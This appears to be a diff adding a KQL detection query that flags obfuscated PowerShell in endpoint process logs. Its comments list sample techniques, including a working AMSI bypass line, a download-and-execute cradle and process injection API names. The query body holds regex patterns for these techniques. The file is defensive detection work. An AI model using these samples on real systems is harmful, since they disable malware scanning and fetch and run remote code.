@@ -1,0 +1,111 @@
+
+// This query detects obfuscated and encoded powershell commands this is the skeleton and will need to be tuned for your environment the detetcion rule / query looks for - 
+// - Base64 encoded commands - cG93ZXJzaGVsbA== (decodes to "powershell")
+// - Hex encoding - 706F7765727368656C6C (hex for "powershell")
+// - Character obfuscation Unicode/Special \u0070\u006f\u0077\u0065\u0072 (powershell.exe -Command "\u0070\u006f\u0077\u0065\u0072")
+// - String concatination - 'po'+'we'+'rs'+'he'+'ll' (powershell.exe -Command ('inv'+'oke'+'-ex'+'press'+'ion'))
+// - Variable obfuscation - $a='iex';$b='malicious';& $a $b $XYZABC='Invoke-Expression';$d='code' 
+// - IEX , Invoke-Expression - iex(New-Object Net.WebClient).DownloadString('url')
+// - Format string obfuscation - {0}{1}{2}" -f 'i','e','x' "{0}{1}{2}{3}{4}" -f 'p','o','w','e','r'"Invoke-{0}pression" -f 'Ex'
+// - Reversed Strings - 'llehsrewop'[-1..-10] -join '''xei'[-1..-3] -join '' | iex[array]::Reverse($cmd);$cmd -join ''
+// - Replace obfuscation - 'p^o^w^e^r^s^h^e^l^l' -replace '\^','''pXoXwXeXr' -replace 'X','''invoQke-expQression' -replace 'Q',''
+// - Frombase32 & Frombase64 conversion -[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('..'))[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4'))$data=[Convert]::FromBase64String('cG93ZXJzaGVsbA==')
+// - char array obfuscation - [char[]]@(112,111,119,101,114)-join([char[]]@(105,101,120))[array][char]@(112,111,119,101,114,115,104,101,108,108)
+// - tick/caret obfuscation - p`o`w`e`r`s`h`e`l`l or p^o^w^e^r^s^h^e^l^li`n`v`o`k`e`-`e`x`p`r`e`s`s`i`o`ni^n^v^o^k^e^-^e^x^p^r^e^s^s^i^o^n
+// - environment variable obfuscation - $env:COMSPEC[4,15,23] (extracts characters)$env:PATH[0]$env:COMSPEC[4]+$env:COMSPEC[15]
+// - Downloads from the internet - curl, iwr, IEX
+// - Hidden Window -  -WindowStyle Hidden or -w h
+// - Anti malware scan interface (AMSI) bypass - [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)$a=[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QW1zaVV0aWxz'))))
+// - Process Injection Indicators - VirtualAlloc, WriteProcessMemory, CreateRemoteThread
+// - mixed case obfuscation - "pOwErShELl" 
+
+DeviceProcessEvents
+// Account filtering
+| where AccountName !in ("")
+and InitiatingProcessAccountName !in ("")
+| where isnotempty(ProcessCommandLine)
+| where ProcessCommandLine !~ "powershell.exe"
+    and ProcessCommandLine !~ "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+    and ProcessCommandLine !~ "pwsh.exe"
+// Filter out incomplete commands
+| where strlen(ProcessCommandLine) > 10
+| extend FullCommand = ProcessCommandLine
+// ONLY allow PowerShell spawned from user-initiated
+| where InitiatingProcessFileName in~ ("powershell.exe", "pwsh.exe", "cmd.exe", "explorer.exe", "")
+    or isempty(InitiatingProcessFileName)
+// Filter out PowerShell with ONLY flags and no actual command content
+| where not(FullCommand matches regex @"powershell(\.exe)?\s+-[a-zA-Z]+\s+-[a-zA-Z]+(\s+-[a-zA-Z]+)*\s*$")
+| where InitiatingProcessFileName in~ ("powershell.exe", "pwsh.exe", "cmd.exe")
+| where not(FullCommand endswith "")
+| where not(FullCommand endswith "")
+// benign patterns observed add as many as you wish
+| where not(FullCommand contains "")
+| where not(FullCommand contains_cs "")
+| extend FullCommand = ProcessCommandLine
+// Obfuscation Regex
+| extend
+HasBase64Encoded = FullCommand matches regex @"-(e|en|enc|encod|encode|encoded|encodedcomm|encodedcomma|encodedcomman|encodedcommand|ec|enco)\s+[A-Za-z0-9+/=]{50,}",
+HasHexEncoding = FullCommand matches regex @"(0x[0-9a-fA-F]{2,}|\[char\]0x[0-9a-fA-F]+)",
+HasUnicodeObfuscation = FullCommand matches regex @"\\u[0-9a-fA-F]{4}",
+HasStringConcat = FullCommand matches regex "['\"]\\w{1,3}['\"]\\s*\\+\\s*['\"]\\w",
+HasVariableObfuscation = FullCommand matches regex @"(\$[a-z]{1,2}\s*=|\$[A-Z]{8,}|-join)",
+HasCompressionEncoding = FullCommand matches regex @"(FromBase64String|IO\.Compression|GZipStream|DeflateStream)",
+HasInvokeObfuscation = FullCommand matches regex @"(&|\.)[\s]*\(|iex[\s]*\(|invoke-expression[\s]*\(",
+HasFormatObfuscation = FullCommand matches regex @"\{[0-9]+\}.*-f\s+",
+HasReverseObfuscation = (FullCommand contains "-split" and FullCommand contains "reverse"),
+HasReplaceObfuscation = FullCommand matches regex @"-replace\s+",
+HasBase32 = FullCommand matches regex @"FromBase(32|64)String",
+HasCharArrayObfuscation = FullCommand matches regex @"\[char\[\]\]|\[array\]\[char\]",
+HasTickObfuscation = FullCommand matches regex @"[a-z]`[a-z]",
+HasEnvVarObfuscation = FullCommand matches regex @"\$env:\w{1,5}\[[0-9]+\]",
+HasDownloadCradle = FullCommand matches regex @"(downloadstring|downloadfile|Net\.WebClient|Invoke-WebRequest|iwr|wget|curl.*\|.*iex)",
+HasHiddenWindow = FullCommand matches regex @"-(w|win|window|windowstyle)\s+(h|1|hidden|minimized)",
+HasAMSIBypass = FullCommand matches regex @"(amsi|ETW|reflection\.assembly)",
+HasInjectionIndicators = FullCommand matches regex @"(VirtualAlloc|WriteProcessMemory|CreateRemoteThread|QueueUserAPC)",
+HasMixedCase = FullCommand matches regex @"[pP][oO0][wW][eE3][rR][sS][hH][eE3][lL]{2}"
+// attempt to extract base64 if present
+| extend Base64Match = extract(@"-(e|en|enc|encoded|encodedcommand|ec)\s+([A-Za-z0-9+/=]{50,})", 2, FullCommand)
+| extend DecodedCommand = iff(isnotempty(Base64Match), base64_decode_tostring(Base64Match), "")
+// Filter for obfuscation
+| where HasBase64Encoded == true
+    or HasHexEncoding == true
+    or HasUnicodeObfuscation == true
+    or HasStringConcat == true
+    or HasVariableObfuscation == true
+    or HasCompressionEncoding == true
+    or HasInvokeObfuscation == true
+    or HasFormatObfuscation == true
+    or HasReverseObfuscation == true
+    or HasReplaceObfuscation == true
+    or HasBase32 == true
+    or HasCharArrayObfuscation == true
+    or HasTickObfuscation == true
+    or HasEnvVarObfuscation == true
+    or HasDownloadCradle == true
+    or HasHiddenWindow == true
+    or HasAMSIBypass == true
+    or HasInjectionIndicators == true
+    or HasMixedCase == true
+// Join with IdentityInfo
+| join kind=leftouter (
+    IdentityInfo
+    | summarize arg_max(TimeGenerated, *) by AccountName
+    | project AccountName, AccountDisplayName, JobTitle, Department, Manager
+) on AccountName
+// Final projection
+| project 
+    TimeGenerated,
+    DeviceName,
+    AccountName,
+    AccountDisplayName,
+    JobTitle,
+    Department,
+    Manager,
+    FileName,
+    FolderPath,
+    ProcessCommandLine,
+    InitiatingProcessFileName,
+    InitiatingProcessCommandLine,
+    FullCommand,
+    DecodedCommand
+| order by TimeGenerated desc
